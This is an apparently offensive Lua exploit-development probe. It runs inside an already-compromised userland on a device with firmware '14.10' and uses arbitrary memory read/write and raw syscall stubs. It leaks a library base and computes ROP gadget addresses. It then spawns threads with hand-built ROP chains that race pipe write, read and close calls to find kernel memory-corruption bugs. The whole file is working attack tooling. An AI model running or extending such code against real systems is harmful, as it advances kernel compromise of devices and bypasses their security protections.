-- CRASH_CLASS: HIGH
-- PROBE 105a: pipe close race — write vs close on pipe fds
--
-- pipe() works on 14.10 (104a/104b confirmed). Pipes have a different
-- kernel implementation than sockets (struct pipe vs struct socket).
-- Pipe locking might be weaker — test concurrent write+close races.
--
-- Sections:
--   A: 1 child writes to pipe_w while main closes pipe_w (basic race)
--   B: Multiple children write while main closes (contention)
--   C: Child reads pipe_r while main closes pipe_r (read side race)
--   D: Cross-fd race: child writes pipe_w, main closes pipe_r
--   E: Pipe create+close churn with concurrent writes

print("=== PROBE 105a: PIPE CLOSE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_pipe=mk(42); local sc_close=mk(6)
local sc_write=mk(4); local sc_read=mk(3)

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end
local function canary()
    local c=N(native.fcall_with_rax(stub,20))
    return c==pid, c
end
local function closef(fd) pcall(function() sc_close(uint64(fd)) end) end
local function makepipe()
    local ok,rv=pcall(function() return sc_pipe() end)
    if ok then return N(rv), N(rv)+1 end
    return -1,-1
end

local SLOTS=6
local STK_PG=2; local PG_PER=STK_PG+1
local TOTAL_PG=4+SLOTS*PG_PER
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl10=R+0x20; wq(sl10,uint64(0)); wq(sl10+8,uint64(10000000))
local tb=R+0x80
local RESULT=R+0x1000

-- Write data buffer
local WDATA=R+0x2000
for i=0,0x100-4,4 do wd(WDATA+i, 0x41424344) end

local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end

local function setup_ctx(slot, rax, rdi, rsi, rdx, r10, r8)
    local ctx=child_ctx(slot)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(child_stk(slot)))
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi))
    wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx or 0))
    wq(ctx+_R10,uint64(r10 or 0))
    wq(ctx+_R8,uint64(r8 or 0))
end

local function spawn_writer(slot, fd_w, data_addr, data_len)
    -- Child: write(fd_w, data, len) → store result → nanosleep
    setup_ctx(slot, 4, fd_w, N(data_addr), data_len)
    local stk=child_stk(slot); local off=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(RESULT+slot*8)); off=off+8
    wq(stk+off,WMOV); off=off+8
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    wq(RESULT+slot*8, uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx(slot)), uint64(tb), uint64(0)) end)
end

local function spawn_reader(slot, fd_r, buf_addr, buf_len)
    setup_ctx(slot, 3, fd_r, N(buf_addr), buf_len)
    local stk=child_stk(slot); local off=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(RESULT+slot*8)); off=off+8
    wq(stk+off,WMOV); off=off+8
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    wq(RESULT+slot*8, uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx(slot)), uint64(tb), uint64(0)) end)
end

local function spawn_closer(slot, fd)
    setup_ctx(slot, 6, fd)
    local stk=child_stk(slot); local off=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(RESULT+slot*8)); off=off+8
    wq(stk+off,WMOV); off=off+8
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    wq(RESULT+slot*8, uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx(slot)), uint64(tb), uint64(0)) end)
end

local vm0=vmc()
print(string.format("region=0x%X vm0=%d", R, vm0))

-- ============================================================
print("")
print("--- A: WRITE vs CLOSE on same pipe_w (20 rounds) ---")
local hits_a=0
for round=1,20 do
    local pr,pw=makepipe()
    if pr<0 then break end

    -- Child slot 0: write(pw, data, 256)
    spawn_writer(0, pw, uint64(WDATA), 256)

    -- Main: close pw IMMEDIATELY (race with child write)
    closef(pw)

    -- Brief wait
    native.fcall_with_rax(stub,240,N(sl10),0)

    local wr_rv=rd(RESULT)
    -- Check if write returned something unexpected
    if wr_rv and wr_rv~=0xDEADCAFE and wr_rv~=256 and
       wr_rv~=0xFFFFFFFF then  -- not sentinel, not success, not -1
        hits_a=hits_a+1
        print(string.format("  !!HIT A[%d]: write rv=0x%X", round, wr_rv))
    end

    closef(pr)

    local ok_c,_=canary()
    if not ok_c then
        print(string.format("  !!CANARY FAIL at round %d", round))
        break
    end

    if round%10==0 then
        print(string.format("  A[%d]: hits=%d vm=%d", round, hits_a, vmc()))
    end
end
print(string.format("A done: hits=%d", hits_a))

-- ============================================================
print("")
print("--- B: 4 WRITERS vs CLOSE (contention, 15 rounds) ---")
local hits_b=0
for round=1,15 do
    local pr,pw=makepipe()
    if pr<0 then break end

    -- 4 children all write to same pipe_w simultaneously
    for s=0,3 do
        spawn_writer(s, pw, uint64(WDATA), 64)
    end

    -- Main closes immediately
    closef(pw)
    native.fcall_with_rax(stub,240,N(sl10),0)

    -- Check results
    for s=0,3 do
        local rv=rd(RESULT+s*8)
        if rv and rv~=0xDEADCAFE and rv~=64 and rv~=0xFFFFFFFF then
            hits_b=hits_b+1
            print(string.format("  !!HIT B[%d] slot %d: rv=0x%X", round, s, rv))
        end
    end

    closef(pr)
    local ok_c,_=canary()
    if not ok_c then print("  !!CANARY") break end

    if round%5==0 then
        print(string.format("  B[%d]: hits=%d vm=%d", round, hits_b, vmc()))
    end
end
print(string.format("B done: hits=%d", hits_b))

-- ============================================================
print("")
print("--- C: READ vs CLOSE on pipe_r (20 rounds) ---")
local hits_c=0
local rbuf=memory.alloc(0x200)
for round=1,20 do
    local pr,pw=makepipe()
    if pr<0 then break end

    -- Write some data first
    pcall(function() sc_write(uint64(pw), uint64(WDATA), uint64(64)) end)

    -- Child reads from pipe_r
    spawn_reader(0, pr, uint64(rbuf), 64)

    -- Main closes pipe_r immediately
    closef(pr)
    native.fcall_with_rax(stub,240,N(sl10),0)

    local rd_rv=rd(RESULT)
    if rd_rv and rd_rv~=0xDEADCAFE and rd_rv~=64 and rd_rv~=0xFFFFFFFF then
        hits_c=hits_c+1
        print(string.format("  !!HIT C[%d]: read rv=0x%X", round, rd_rv))
    end

    closef(pw)
    local ok_c,_=canary()
    if not ok_c then print("  !!CANARY") break end

    if round%10==0 then
        print(string.format("  C[%d]: hits=%d", round, hits_c))
    end
end
print(string.format("C done: hits=%d", hits_c))

-- ============================================================
print("")
print("--- D: WRITE pipe_w + CLOSE pipe_r (cross-fd, 20 rounds) ---")
local hits_d=0
for round=1,20 do
    local pr,pw=makepipe()
    if pr<0 then break end

    -- Child writes to pipe_w
    spawn_writer(0, pw, uint64(WDATA), 256)

    -- Main closes pipe_r (reader end) — may trigger broken pipe
    closef(pr)
    native.fcall_with_rax(stub,240,N(sl10),0)

    local wr_rv=rd(RESULT)
    -- EPIPE/SIGPIPE when writing to pipe with closed read end
    -- Expected: write returns -1 with EPIPE. But timing matters.
    if wr_rv and wr_rv~=0xDEADCAFE and wr_rv~=256 and
       wr_rv~=0xFFFFFFFF then
        hits_d=hits_d+1
        print(string.format("  !!HIT D[%d]: write rv=0x%X", round, wr_rv))
    end

    closef(pw)
    local ok_c,_=canary()
    if not ok_c then print("  !!CANARY") break end

    if round%10==0 then
        print(string.format("  D[%d]: hits=%d", round, hits_d))
    end
end
print(string.format("D done: hits=%d", hits_d))

-- ============================================================
print("")
print("--- E: PIPE CHURN + concurrent write (20 rounds) ---")
local hits_e=0
for round=1,20 do
    local pr,pw=makepipe()
    if pr<0 then break end

    -- Child writes to pipe_w (large write to keep it busy)
    spawn_writer(0, pw, uint64(WDATA), 256)

    -- Main: close BOTH ends + create new pipe (fd reuse race)
    closef(pw); closef(pr)
    local pr2,pw2=makepipe()

    native.fcall_with_rax(stub,240,N(sl10),0)

    local wr_rv=rd(RESULT)
    if wr_rv and wr_rv~=0xDEADCAFE and wr_rv~=256 and
       wr_rv~=0xFFFFFFFF and wr_rv~=0 then
        hits_e=hits_e+1
        print(string.format("  !!HIT E[%d]: write rv=0x%X", round, wr_rv))
    end

    if pr2>=0 then closef(pr2); closef(pw2) end
    local ok_c,_=canary()
    if not ok_c then print("  !!CANARY") break end

    if round%10==0 then
        print(string.format("  E[%d]: hits=%d", round, hits_e))
    end
end
print(string.format("E done: hits=%d", hits_e))

-- ============================================================
print("")
local vm_f=vmc()
local fc_ok,_=canary()
print(string.format("FINAL: canary=%s vm=%d->%d d=%d hits=%d",
    fc_ok and "OK" or "FAIL", vm0, vm_f, vm_f-vm0,
    hits_a+hits_b+hits_c+hits_d+hits_e))
print(string.format("SUMMARY: A=%d B=%d C=%d D=%d E=%d",
    hits_a, hits_b, hits_c, hits_d, hits_e))
print("=== 105a COMPLETE ===")
